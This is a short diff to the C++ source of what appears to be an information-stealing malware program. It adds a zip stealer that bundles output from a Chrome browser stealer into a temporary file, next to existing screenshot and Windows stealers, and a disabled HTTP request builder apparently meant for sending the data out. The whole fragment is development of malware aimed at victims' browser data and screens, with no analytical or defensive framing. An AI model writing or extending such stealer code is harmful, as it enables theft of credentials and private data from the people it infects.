@@ -17,6 +17,7 @@
 #include "stealers/chrome_stealer.h"
 #include "stealers/srceenshot_stealer.h"
 #include "stealers/win_stealer.h"
+#include "stealers/zip_stealer.h"
 
 #if 0
 http::request<http::string_body> prepare_request(const json::object& obj)
@@ -124,7 +125,13 @@ asio::awaitable<void> co_main()
     std::vector<std::unique_ptr<base_stealer_t>> stealers;
     stealers.emplace_back(std::make_unique<srceenshot_stealer_t>());
     stealers.emplace_back(std::make_unique<win_stealer_t>());
-    stealers.emplace_back(std::make_unique<chrome_stealer_t>());
+
+    auto stealers_to_zip = zip_stealer_t::to_zip_t{};
+    stealers_to_zip.emplace_back(std::make_unique<chrome_stealer_t>());
+    stealers.emplace_back(
+        std::make_unique<zip_stealer_t>(
+            std::move(stealers_to_zip)
+            , net::get_temp_unique_file_path()));
 
     std::vector<asio::awaitable<void>> tasks;
     for (auto& st : stealers)
